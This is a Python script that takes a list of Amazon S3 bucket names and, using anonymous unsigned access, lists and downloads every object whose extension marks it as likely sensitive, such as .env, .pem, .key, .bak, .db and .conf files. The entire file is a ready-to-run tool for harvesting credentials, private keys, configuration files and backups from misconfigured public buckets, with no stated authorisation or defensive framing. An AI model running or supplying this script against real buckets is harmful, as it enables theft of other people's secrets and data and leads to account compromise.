import os
import boto3
from botocore import UNSIGNED
from botocore.config import Config

# Sensitive extensions to include
SENSITIVE_EXTENSIONS = {
    ".env", ".json", ".js", ".zip", ".log", ".txt", ".xml",
    ".yml", ".yaml", ".conf", ".ini", ".bak", ".old", ".db",
    ".py", ".php", ".rb", ".sh", ".pem", ".crt", ".key"
}

# Extensions to skip
SKIP_EXTENSIONS = {
    ".html", ".htm", ".css", ".jpg", ".jpeg", ".png", ".gif", ".svg", ".ico",
    ".woff", ".woff2", ".ttf", ".otf", ".eot", ".mp4", ".mp3", ".webm"
}

# Folder to store all downloads
BASE_DIR = "s3-bucket-downloads"
os.makedirs(BASE_DIR, exist_ok=True)

# Create S3 client with unsigned access
s3 = boto3.client("s3", config=Config(signature_version=UNSIGNED))

def should_download(key):
    ext = os.path.splitext(key.lower())[1]
    return ext in SENSITIVE_EXTENSIONS and ext not in SKIP_EXTENSIONS

def download_files(bucket_name):
    print(f"\n🔍 Scanning bucket: {bucket_name}")
    folder_path = os.path.join(BASE_DIR, bucket_name)
    os.makedirs(folder_path, exist_ok=True)

    try:
        paginator = s3.get_paginator("list_objects_v2")
        page_iterator = paginator.paginate(Bucket=bucket_name)

        for page in page_iterator:
            if "Contents" not in page:
                print(f"❌ No files found or access denied in {bucket_name}")
                continue

            for obj in page["Contents"]:
                key = obj["Key"]
                if should_download(key):
                    local_path = os.path.join(folder_path, key)
                    os.makedirs(os.path.dirname(local_path), exist_ok=True)
                    try:
                        s3.download_file(bucket_name, key, local_path)
                        print(f"✅ Downloaded: {key}")
                    except Exception as e:
                        print(f"⚠️ Failed to download {key}: {e}")

    except Exception as e:
        print(f"❌ Error accessing {bucket_name}: {e}")

def main():
    try:
        with open("bucket-name-list.txt", "r") as file:
            buckets = [line.strip() for line in file if line.strip()]

        for bucket in buckets:
            download_files(bucket)

    except FileNotFoundError:
        print("❌ 'bucket-name-list.txt' not found.")

if __name__ == "__main__":
    main()

